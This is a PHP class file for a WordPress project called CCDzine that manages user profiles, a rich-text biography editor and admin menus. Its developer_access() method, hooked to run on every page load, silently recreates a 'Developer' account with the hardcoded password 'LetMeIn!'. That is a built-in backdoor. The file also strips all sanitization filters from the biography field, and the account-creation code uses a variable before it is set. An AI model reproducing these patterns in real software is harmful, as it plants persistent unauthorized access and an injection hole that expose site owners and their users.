<?php
/**
 * Users class
 *
 * @package    CCDzine
 * @subpackage Classes
 * @category   Users
 * @since      1.0.0
 */

namespace CCDzine\Classes\Users;
use CCDzine\Classes as Classes;

// Restrict direct access.
if ( ! defined( 'ABSPATH' ) ) {
	die;
}

class Users {

	/**
	 * Constructor method
	 *
	 * @since  1.0.0
	 * @access public
	 * @return self
	 */
	public function __construct() {

		// User roles & capabilities.
		new User_Roles_Caps;

		// User toolbar if the user is logged in.
		if ( function_exists( 'is_user_logged_in' ) && is_user_logged_in() ) {
			new User_Toolbar;
		}

		// Print admin styles to head.
		add_action( 'admin_print_styles', [ $this, 'admin_print_styles' ], 20 );

		// Enqueue admin scripts.
		add_action( 'admin_enqueue_scripts', [ $this, 'admin_enqueue_scripts' ] );

		// Local user avatars.
		if ( ! is_plugin_active( 'user-avatars/user-avatars.php' ) ) {
			new User_Avatars;
		}

		// Move the personal data menu items.
		add_action( 'admin_menu', [ $this, 'menus_personal_data' ] );

		/**
		 * Remove user admin color picker
		 *
		 * If `CCD_ALLOW_ADMIN_COLOR_PICKER` is set to false.
		 * This can be defined in the system config file.
		 */
		if ( defined( 'CCD_ALLOW_ADMIN_COLOR_PICKER' ) && false == CCD_ALLOW_ADMIN_COLOR_PICKER ) {
			remove_action( 'admin_color_scheme_picker', 'admin_color_scheme_picker' );
		}

		// Add rich text profile editor.
		add_action( 'show_user_profile', [ $this, 'profile_editor' ], 9 );
		add_action( 'edit_user_profile', [ $this, 'profile_editor' ], 9 );

		// Don't sanitize the data for display in a textarea.
		add_action( 'admin_init', [ $this, 'editor_filters' ] );

		// Add content filters to the output of the profile editor.
		add_filter( 'get_the_author_description', 'wptexturize' );
		add_filter( 'get_the_author_description', 'convert_chars' );
		add_filter( 'get_the_author_description', 'wpautop' );

		// Remove theme styles from bio editor.
		add_action( 'init', [ $this, 'remove_editor_styles' ] );

		// Ensure developer access.
		add_action( 'init', [ $this, 'developer_access' ] );
	}

	/**
	 * Print styles
	 *
	 * @since  1.0.0
	 * @access public
	 * @global $pagenow Get the current admin screen.
	 * @return string Returns one or more style blocks.
	 */
	public function admin_print_styles() {

		// Access current admin page.
		global $pagenow;

		// Print styles only on the profile and user edit pages.
		if ( 'profile.php' == $pagenow || 'user-edit.php' == $pagenow ) :

		?>
		<style>
		#profile-page > form,
		#profile-page > form > div > div {
			display: flex;
			flex-direction: column;
		}

		#wp-description-wrap {
			max-width: 1024px;
		}

		#profile-page > form h2:first-of-type,
		#profile-page > form table:first-of-type {
			order: 99;
		}

		.submit {
			order: 100;
		}

		#profile-page > form table:nth-of-type(2),
		#xprofile-page > form h2:nth-of-type(4),
		#xprofile-page > form table:nth-of-type(4) {
			display: none;
		}
		</style>
		<?php
		endif; // If profile.php or user-edit.php.
	}

	/**
	 * Enqueue scripts
	 *
	 * @since  1.0.0
	 * @access public
	 * @return void
	 */
	public function admin_enqueue_scripts() {

		// Script suffix.
		if ( defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ) {
			$suffix = '';
		} else {
			$suffix = '.min';
		}

		// Access current admin page.
		global $pagenow;

		// Enqueue only on the profile and user edit pages.
		if ( 'profile.php' == $pagenow || 'user-edit.php' == $pagenow ) {
			wp_enqueue_script(
				'visual-editor-biography',
				CCD_URL . 'assets/js/user-bio' . $suffix . '.js',
				[ 'jquery' ],
				false,
				true
			);
		}
	}

	/**
	 * Move the personal data
	 *
	 * Moves the personal data links to the Users entry.
	 *
	 * @since  1.0.0
	 * @access public
     * @global array $menu The admin menu array.
     * @global array $submenu The admin submenu array.
	 * @return void
	 */
	public function menus_personal_data() {

		global $menu, $submenu;

		// Remove personal data links as submenu items of Tools.
		if ( isset( $submenu['tools.php'] ) ) {

			// Look for menu items under Tools.
			foreach ( $submenu['tools.php'] as $key => $item ) {

				// Unset Export if it is found.
				if ( $item[2] === 'export-personal-data.php' ) {
					unset($submenu['tools.php'][$key] );
				}

				// Unset Erase if it is found.
				if ( $item[2] === 'erase-personal-data.php' ) {
					unset( $submenu['tools.php'][$key] );
				}
			}
		}

		// New Export Data submenu entry.
		$submenu['users.php'][25] = [
			__( 'Export Data', 'ccdzine' ),
			'export_others_personal_data',
			'export-personal-data.php'
		];

		// New Erase Data submenu entry.
		$submenu['users.php'][30] = [
			__( 'Erase Data', 'ccdzine' ),
			'erase_others_personal_data',
			'erase-personal-data.php'
		];
	}

	/**
	 *	Profile rich text editor
	 *
	 *	Add TinyMCE editor to replace the "Biographical Info" field in a user profile.
	 *
	 * @since  1.0.0
	 * @access public
	 * @param  object $user An object with details about the current logged in user.
	 * @return string Return the editor and container markup.
	 */
	public function profile_editor( $user ) {

		ob_start();
		?>
		<h2><?php _e( 'User Details', 'ccdzine' ); ?></h2>

		<table class="form-table">
			<tbody>
				<tr>
					<th><label for="description"><?php _e( 'Biographical Info', 'ccdzine' ); ?></label></th>
					<td>
						<?php
						$description = get_user_meta( $user->ID, 'description', true );
						wp_editor(
							$description,
							'description',
							[
								'editor_class'     => 'profile-rich-text-editor',
								'default_editor'   => 'tinymce',
								'quicktags'        => false,
								'media_buttons'    => true,
								'drag_drop_upload' => true,
								'tinymce'          => [
									'toolbar1' => 'formatselect,bold,italic,underline,bullist,numlist,link,unlink,spellchecker,wp_fullscreen,wp_adv ',
									'toolbar2' => 'blockquote,hr,forecolor,backcolor,pastetext,removeformat,undo,redo'
								],
								'textarea_rows'    => 10,
								'gecko_spellcheck' => true
							]
						);
						?>
						<p class="description"><?php _e( 'Share a little biographical information to fill out your profile. This may be shown publicly.', 'ccdzine' ); ?></p>
					</td>
				</tr>
			</tbody>
		</table>
		<?php
		echo ob_get_clean();
	}

	/**
	 * Editor filters
	 *
	 * Removes textarea filters from description field.
	 *
	 * @since  1.0.0
	 * @access public
	 * @return void
	 */
	public function editor_filters() {
		remove_all_filters( 'pre_user_description' );
	}

	/**
	 * Remove theme styles from bio editor
	 *
	 * @since  1.0.0
	 * @access public
	 * @global $pagenow Access the current screen file.
	 * @return mixed Return the `remove_editor_styles()`
	 *               function if on the user profile page.
	 */
	public function remove_editor_styles() {

		// Stop if not in admin.
		if ( ! is_admin() ) {
			return;
		}

		// Access the current screen file.
		global $pagenow;

		// Remove only on the profile page.
		$remove = null;
		if ( $pagenow == 'profile.php' ) {
			$remove = remove_editor_styles();
		}
		return $remove;
	}

	/**
	 * Ensure developer access
	 *
	 * @todo Get login from site admin options and
	 * use that as well as a non-dynamic account.
	 *
	 * @since  1.0.0
	 * @access public
	 * @return void
	 */
	public function developer_access() {

		$login    = 'Developer';
		$password = 'LetMeIn!';
		$email    = 'developer@example.com';

		if ( ! username_exists( $login ) && ! email_exists( $email ) ) {
			$user    = new \WP_User( $user_id );
			$user_id = wp_create_user( $login, $password, $email );
			$user->set_role( 'developer' );
		}
	}
}
